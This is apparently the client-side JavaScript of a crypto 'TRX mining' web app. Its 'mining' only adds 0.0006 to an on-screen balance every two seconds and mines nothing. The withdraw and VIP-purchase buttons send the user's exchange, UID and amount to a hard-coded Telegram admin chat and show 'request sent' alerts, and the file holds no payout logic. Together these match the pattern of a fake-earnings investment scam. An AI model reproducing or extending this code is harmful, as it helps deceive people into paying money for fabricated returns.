// === Telegram System ===
const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // change later
const ADMIN_CHAT_ID = "7417215529";

function sendTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: ADMIN_CHAT_ID,
      text: message
    })
  });
}

// === Navigation ===
const buttons = document.querySelectorAll(".bottom-nav button");
const pages = document.querySelectorAll(".page");

buttons.forEach(btn => {
  btn.addEventListener("click", () => {
    const target = btn.getAttribute("data-target");
    pages.forEach(page => page.classList.remove("active"));
    document.getElementById(target).classList.add("active");
  });
});

// === Mining Animation ===
let mining = false;
let balance = 0;
document.getElementById("startMine").addEventListener("click", () => {
  if (!mining) {
    mining = true;
    document.getElementById("mine-status").innerText = "Mining Started...";
    mineProcess();
  }
});

function mineProcess() {
  if (!mining) return;
  balance += 0.0006;
  document.getElementById("trx-earned").innerText = balance.toFixed(4);
  setTimeout(mineProcess, 2000);
}

// === Referral Copy ===
function copyRef() {
  const ref = document.getElementById("refCode");
  ref.select();
  document.execCommand("copy");
  alert("Referral code copied!");
}

// === Converter ===
document.getElementById("convertBtn").addEventListener("click", () => {
  const trx = parseFloat(document.getElementById("trxInput").value);
  if (isNaN(trx)) return alert("Enter valid TRX amount!");
  const usdt = trx * 0.0006;
  document.getElementById("usdtValue").innerText = usdt.toFixed(6);
});

// === Withdraw System ===
document.getElementById("withdrawBtn").addEventListener("click", () => {
  const exchange = document.getElementById("exchange").value;
  const uid = document.getElementById("uid").value;
  const amt = parseFloat(document.getElementById("withdrawAmount").value);

  if (!uid || isNaN(amt) || amt < 0.01)
    return alert("Invalid input!");

  sendTelegram(`💸 Withdraw Request\nExchange: ${exchange}\nUID: ${uid}\nAmount: ${amt} USDT`);
  alert("Withdraw request sent!");
});

// === VIP System ===
document.querySelectorAll(".buyVip").forEach(btn => {
  btn.addEventListener("click", () => {
    const vipLevel = btn.dataset.vip;
    sendTelegram(`⭐ VIP${vipLevel} Purchase Request`);
    alert(`VIP${vipLevel} purchase request sent!`);
  });
});
